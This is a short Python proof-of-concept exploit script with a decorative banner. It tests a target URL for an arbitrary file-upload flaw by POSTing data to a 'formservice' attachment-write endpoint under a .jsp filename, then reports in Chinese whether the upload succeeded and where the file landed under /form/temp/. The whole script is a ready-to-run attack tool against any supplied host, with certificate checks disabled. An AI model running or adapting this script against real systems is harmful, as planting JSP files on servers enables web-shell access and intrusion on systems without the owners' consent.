import requests
import argparse
import re
import sys
test = """
           __        __  __                                                __        __                               
          |  \      |  \|  \                                              |  \      |  \                              
  _______ | $$____   \$$| $$   __   ______   _______    ______   ________ | $$____   \$$ __    __   ______   __    __ 
 /       \| $$    \ |  \| $$  /  \ /      \ |       \  /      \ |        \| $$    \ |  \|  \  |  \ /      \ |  \  |  \
|  $$$$$$$| $$$$$$$\| $$| $$_/  $$|  $$$$$$\| $$$$$$$\|  $$$$$$\ \$$$$$$$$| $$$$$$$\| $$| $$  | $$|  $$$$$$\| $$  | $$
 \$$    \ | $$  | $$| $$| $$   $$ | $$  | $$| $$  | $$| $$  | $$  /    $$ | $$  | $$| $$| $$  | $$| $$  | $$| $$  | $$
 _\$$$$$$\| $$  | $$| $$| $$$$$$\ | $$__/ $$| $$  | $$| $$__| $$ /  $$$$_ | $$  | $$| $$| $$__/ $$| $$__/ $$| $$__/ $$
|       $$| $$  | $$| $$| $$  \$$\ \$$    $$| $$  | $$ \$$    $$|  $$    \| $$  | $$| $$ \$$    $$ \$$    $$ \$$    $$
 \$$$$$$$  \$$   \$$ \$$ \$$   \$$  \$$$$$$  \$$   \$$ _\$$$$$$$ \$$$$$$$$ \$$   \$$ \$$ _\$$$$$$$  \$$$$$$   \$$$$$$ 
                                                      |  \__| $$                        |  \__| $$                    
                                                       \$$    $$                         \$$    $$                    
                                                        \$$$$$$                           \$$$$$$                 
                                                        @author: LGJ
"""
print(test)
def poc(url):
    headers= {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
    }
    data='''123'''
    requests.packages.urllib3.disable_warnings()
    try:
        req=requests.post(url+"/formservice?service=attachment.write&isattach=false&filename=test1.jsp",headers=headers,timeout=10,verify=False,data=data)
    except:
        print("目标不能访问")
        sys.exit()
    try:
        text=req.text.encode("iso-8859-1").decode("utf-8")
        pattern = r"<root>(.*?)<\/root>"
        match = re.search(pattern, text)
        if match:
            extracted_content = match.group(1)
            print("上传成功  路径: /form/temp/"+extracted_content)
        else:
            print("没有漏洞")
    except:
        print("没有漏洞")
        sys.exit()


def arg():
    parser = argparse.ArgumentParser(description="Simple command line tool")
    parser.add_argument("-u", "--url", required=True, help="URL to target")
    args = parser.parse_args()
    url = args.url
    return url

if __name__ == '__main__':
    url=arg()
    poc(url)